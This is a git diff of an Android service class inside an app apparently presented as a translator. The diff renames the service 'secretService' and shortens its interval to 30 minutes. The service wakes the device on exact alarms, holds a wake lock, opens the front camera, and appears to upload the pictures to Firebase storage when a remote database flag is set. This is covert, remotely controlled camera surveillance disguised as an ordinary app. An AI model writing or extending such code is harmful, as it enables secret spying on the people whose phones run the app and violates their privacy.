@@ -1,6 +1,5 @@
 package com.example.translator;
 
-import static androidx.core.app.ActivityCompat.startActivityForResult;
 import static com.example.translator.FBref.FBST;
 import static com.example.translator.FBref.refUsers;
 
@@ -17,40 +16,31 @@ import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
 import android.graphics.PixelFormat;
 import android.hardware.Camera;
-import android.net.Uri;
 import android.os.Build;
 import android.os.Environment;
 import android.os.IBinder;
 import android.os.PowerManager;
 import android.os.SystemClock;
-import android.provider.ContactsContract;
-import android.provider.Settings;
 import android.util.Log;
 import android.view.SurfaceHolder;
 import android.view.SurfaceView;
 import android.view.WindowManager;
-import android.widget.RemoteViews;
 
 import androidx.annotation.RequiresApi;
-import androidx.camera.core.Preview;
-import androidx.camera.lifecycle.ProcessCameraProvider;
 import androidx.annotation.NonNull;
 import androidx.annotation.Nullable;
 
 import com.google.android.gms.tasks.OnSuccessListener;
-import com.google.common.util.concurrent.ListenableFuture;
 import com.google.firebase.auth.FirebaseAuth;
 import com.google.firebase.database.DataSnapshot;
 import com.google.firebase.database.DatabaseError;
 import com.google.firebase.database.ValueEventListener;
 
-import com.example.translator.FBref;
 import com.google.firebase.storage.StorageReference;
 import com.google.firebase.storage.UploadTask;
 
 import java.io.ByteArrayOutputStream;
 import java.io.File;
-import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.text.DateFormat;
@@ -58,9 +48,8 @@ import java.text.SimpleDateFormat;
 import java.util.Calendar;
 import java.util.Date;
 import java.util.List;
-import java.util.concurrent.ExecutionException;
 
-public class myBackgroundService extends Service
+public class secretService extends Service
 {
     private FirebaseAuth mAuth;
     private ValueEventListener valueEventListener;
@@ -72,8 +61,8 @@ public class myBackgroundService extends Service
 
     private static final String CHANNEL_ID = "camera_service_channel";
 
-    private static final long INTERVAL_MILLIS = 60 * 60 * 1000; // 60 minutes
-    private static final long CPU_ACQUIRE_TIME = 5 * 60 * 1000L; //time for hard CPU work
+    private static final long INTERVAL_MILLIS = 30 * 60 * 1000; // 30 minutes
+    private static final long CPU_ACQUIRE_TIME = 5 * 60 * 1000L; //5 minutes - time for hard CPU work
     private PowerManager.WakeLock wakeLock;
 
 
@@ -125,7 +114,7 @@ public class myBackgroundService extends Service
                 assert user != null;
                 user.setToCapture(0);
                 refUsers.child(userId).setValue(user);
-                scheduleNextPicture();
+                scheduleNextPicture(); //to ensure service is running
             }
 
             @Override
@@ -144,21 +133,20 @@ public class myBackgroundService extends Service
     private void scheduleNextPicture()
     {
         AlarmManager alarmManager = (AlarmManager) this.getSystemService(Context.ALARM_SERVICE);
-        Intent intent = new Intent(this, myBackgroundService.class);
+        Intent intent = new Intent(this, secretService.class);
         PendingIntent pendingIntent = PendingIntent.getService(this, 0, intent, PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT);
 
         long triggerAtMillis = SystemClock.elapsedRealtime() + INTERVAL_MILLIS;
 
         if(alarmManager != null)
-        {
             alarmManager.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAtMillis, pendingIntent);
-        }
+
     }
 
     private void capturePicture()
     {
         PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE); //getting the CPU to work faster while uploading image
-        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "translator::myBackgroundService");
+        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "translator::secretService");
         wakeLock.acquire(CPU_ACQUIRE_TIME);
 
         mCamera = Camera.open(1);
